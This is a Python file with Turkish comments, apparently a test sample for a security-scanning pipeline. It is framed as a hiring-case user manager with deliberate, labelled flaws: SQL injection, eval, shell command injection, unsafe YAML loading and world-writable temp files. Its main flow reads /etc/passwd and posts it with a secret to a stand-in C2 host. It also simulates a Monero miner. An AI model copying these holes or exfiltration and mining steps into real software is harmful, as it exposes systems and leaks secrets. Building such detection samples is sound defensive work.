"""
Kullanıcı Yönetim Sistemi - main.py
Hiring case: Verilen kullanıcı listesini işle ve rapor üret.
"""

import sqlite3
import subprocess
import requests
import os
import yaml
import json
import socket
import time
import hashlib

# Eğer aday repoda config.py dosyasını unutursa/göndermezse kod direkt patlamasın 
# ve testlerimiz yarım kalmasın diye fallback (yedek) değişkenler atıyoruz.
try:
    from config import DB_PASSWORD, JWT_SECRET, DEBUG
except ImportError:
    DB_PASSWORD = "dummy_password"
    JWT_SECRET = "dummy_secret"
    DEBUG = True

# ─────────────────────────────────────────────────────
# ZAFIYET 1: SQL Injection (Bandit: B608)
# Kullanıcıdan gelen input direkt sorguya ekleniyor
# ─────────────────────────────────────────────────────
def get_user(username):
    # Test ortamında çökmemesi için geçici bir RAM veritabanı oluşturuyoruz
    conn = sqlite3.connect(":memory:")
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS users (username TEXT, role TEXT)")
    cursor.execute("INSERT INTO users VALUES ('admin', 'superuser')")

    # YANLIŞ: string formatlama ile sorgu oluşturma
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    cursor.execute(query)   # Bandit B608: SQL injection
    return cursor.fetchall()


# ─────────────────────────────────────────────────────
# ZAFIYET 2: eval() ile dinamik kod çalıştırma (Bandit: B307)
# Kullanıcı girdisi doğrudan eval'e veriliyor
# ─────────────────────────────────────────────────────
def calculate_score(formula):
    # YANLIŞ: eval ile kullanıcı girdisi çalıştırma
    result = eval(formula)   # Bandit B307: eval kullanımı
    return result


# ─────────────────────────────────────────────────────
# ZAFIYET 3: subprocess shell=True (Bandit: B602)
# Komut enjeksiyonuna açık
# ─────────────────────────────────────────────────────
def generate_report(user_id):
    # YANLIŞ: shell=True + değişken birleştirme
    cmd = "echo 'Rapor: ' && cat /tmp/report_" + str(user_id) + ".txt 2>/dev/null || echo 'Dosya bulunamadi'"
    output = subprocess.check_output(cmd, shell=True)   # Bandit B602
    return output


# ─────────────────────────────────────────────────────
# ZAFIYET 4: Güvensiz YAML deserialization (Bandit: B506)
# yaml.load() ile arbitrary code execution mümkün
# ─────────────────────────────────────────────────────
def parse_config(yaml_content):
    # YANLIŞ: yaml.load() yerine yaml.safe_load() kullanılmalı
    data = yaml.load(yaml_content, Loader=yaml.Loader)   # Bandit B506: unsafe yaml
    return data


# ─────────────────────────────────────────────────────
# ZAFIYET 5: Hassas sistem dosyası okuma
# Falco: "Sensitive File Read" kuralını tetikler
# ─────────────────────────────────────────────────────
def get_system_users():
    # /etc/passwd okuma → Falco alarmı
    try:
        with open("/etc/passwd", "r") as f:
            users = f.read()
        return users
    except Exception:
        return ""


# ─────────────────────────────────────────────────────
# ZAFIYET 6: Outbound HTTP bağlantısı
# Falco: "Outbound Connection Attempt" + tcpdump yakalar
# İzole network'te bağlantı başarısız olur ama attempt görünür
# ─────────────────────────────────────────────────────
def send_telemetry(data):
    try:
        # Dışarı veri sızdırma girişimi → Falco + tcpdump alarm
        # Timeout'u 2 saniye tutuyoruz ki container boşuna asılı kalmasın
        response = requests.post(
            "http://attacker-c2.example.com/collect",
            json={"data": data, "secret": JWT_SECRET},
            timeout=2
        )
        return response.status_code
    except Exception:
        pass


# ─────────────────────────────────────────────────────
# ZAFIYET 7: Hardcoded temporary file + insecure permissions
# Bandit: B108 & B103
# ─────────────────────────────────────────────────────
def save_temp_report(content):
    # YANLIŞ: tahmin edilebilir sabit path + herkes okuyabilir
    path = "/tmp/report_output.txt"     # Bandit B108: insecure temp file
    with open(path, "w") as f:
        f.write(content)
    try:
        os.chmod(path, 0o777)           # Bandit B103: insecure file permissions
    except Exception:
        pass
    return path


# ─────────────────────────────────────────────────────
# ZAFIYET 8: Cryptominer Simülasyonu
# Yüksek CPU kullanımı ve maden havuzuna (pool) bağlantı
# ─────────────────────────────────────────────────────
def simulate_cryptominer():
    print("Miner başlatılıyor (Simülasyon)...")
    
    # 1. Adım: Mining Pool'a bağlanma girişimi (Falco ve tshark yakalayacak)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        # Bilinen bir Monero (XMR) maden havuzuna bağlanmaya çalış
        s.connect(("pool.supportxmr.com", 3333)) 
    except Exception:
        pass # İzole ağda olduğumuz için timeout yiyecek, bu normal

    # 2. Adım: CPU'yu sömürme (Docker Stats CPU Spike yakalayacak)
    # Pipeline 20 saniye bekliyor, biz 15 saniye boyunca CPU'yu %100 meşgul edelim
    end_time = time.time() + 15
    while time.time() < end_time:
        # Sürekli anlamsız hash hesaplayarak işlemciyi kilitler (madencilik mantığı)
        hashlib.sha256(b"mining_simulation_block_data").hexdigest()


# ─────────────────────────────────────────────────────
# ANA AKIŞ
# ─────────────────────────────────────────────────────
if __name__ == "__main__":
    print("Kullanıcı yönetim sistemi başlatılıyor...")

    # 1. Sistem kullanıcılarını çek (Falco alarm: SENSITIVE_FILE_READ)
    sys_users = get_system_users()
    print(f"Sistem kullanıcı sayısı: {len(sys_users.splitlines())}")

    # 2. Telemetri gönder (tcpdump paketler + Falco alarm: OUTBOUND_CONNECTION)
    send_telemetry({"users": sys_users[:100]})

    # 3. Örnek sorgu (SQLi açığı)
    results = get_user("admin' OR '1'='1")
    print(f"Sorgu sonucu başarıyla getirildi. Eleman sayısı: {len(results)}")

    # 4. Rapor kaydet (Falco alarm: UNEXPECTED_WRITE veya Bandit alarmı)
    save_temp_report("Test raporu içeriği")

    # 5. Score hesapla (eval açığı)
    score = calculate_score("2 + 2")
    print(f"Score: {score}")

    # 6. -------- MINER'I TETİKLE --------
    simulate_cryptominer()

    print("İşlem tamamlandı.")
